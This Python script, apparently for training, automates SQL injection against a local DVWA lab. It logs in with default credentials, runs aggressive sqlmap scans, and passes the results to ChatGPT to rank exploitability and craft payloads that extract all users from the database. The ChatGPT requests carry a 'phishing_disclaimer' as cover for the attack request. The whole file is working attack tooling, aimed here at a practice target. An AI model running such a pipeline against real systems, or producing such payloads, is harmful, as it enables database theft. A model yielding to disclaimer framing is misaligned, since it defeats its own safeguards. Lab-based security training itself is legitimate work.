"""
Leveraging ChatGPT for SQL Injection Attack Vector Development
Automating Vulnerability Discovery
['Integrate ChatGPT with automated scanning tools to enhance the detection of SQLi vulnerabilities.', 
'Utilize ChatGPT to interpret scan results and prioritize vulnerabilities based on exploitability and impact.', 
'Apply ChatGPT to refine scanning techniques, reducing false positives and focusing on high-value targets.', 
'Implement a continuous monitoring strategy with ChatGPT to identify newly introduced SQLi vulnerabilities.']
This script is for for training purposes only
"""
import requests
import subprocess
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_automating_vulnerability_discovery(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def analyze_sqli(self, s, sqlmap_output):
        prompt = f"Analyze the following SQLMAP SQL injection scan results: {sqlmap_output} and provide insights on detected vulnerabilities, their exploitability for the purpose of red teaming."
        guidance = self.phishing_disclaimer
        analytical_response = self.red_team_query(prompt, guidance)
        return analytical_response    

    def develop_payload(self, sqlmap_analysis, file_content, target_url):
        prompt = f"Based on the log file: {file_content} and the  associated following analysis: {sqlmap_analysis} - Craft an sql injection payload for each of the injection types. The payload will be delivered through {target_url} with the purpose to extract all users from the database."
        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
        payload = self.red_team_query(prompt, guidance)
        return payload    

    def run_sqlmap(self, s, phpsessid, target_url):
        # Assemble the SQLmap command with necessary options
        command = [
            "sqlmap",
            "--random-agent",
            "--threads", "10",
            "-u", target_url,
            "--cookie", f"security=low; PHPSESSID={phpsessid}",
            "--risk", "3",
            "--level", "5",
            "-v", "4",
            "--dbs",
            "--flush-session",
            "--batch",
            "--answers", "keep testing=N",
            "--proxy", "http://127.0.0.1:8080",
            #"--all",
            "-p", "id",
            '--output-dir', "./output/",
        ]

        # Execute SQLmap with subprocess and capture output
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        # Wait for the command to complete
        stdout, _ = process.communicate()
        print (stdout)

    def main(self):
        with requests.Session() as s:
            user_token, cookies = self.get_csrf_token_and_cookie(s, self.login_url)
            _ = self.login_to_dvwa(s, self.login_url, "admin", "password", user_token)
            phpsessid = s.cookies.get('PHPSESSID', domain="127.0.0.1")
            print(phpsessid)

            target_url = "http://127.0.0.1/vulnerabilities/sqli/?id=*&Submit=Submit"

            # Run SQLmap and collect vulnerabilities
            _= ai.run_sqlmap(s, phpsessid, target_url)

            # SQLMAP outputs log file to site dir in current dir
            with open(f"{os.getcwd()}/output/127.0.0.1/log", 'r') as file:
                file_content = file.read()
                print(file_content)

            sqlmap_analysis = self.analyze_sqli(s, file_content)
            print(sqlmap_analysis)

            payload = self.develop_payload(sqlmap_analysis, file_content, target_url)
            print(payload)




if __name__ == "__main__":
    ai = PointlessAI_automating_vulnerability_discovery()
    ai.main()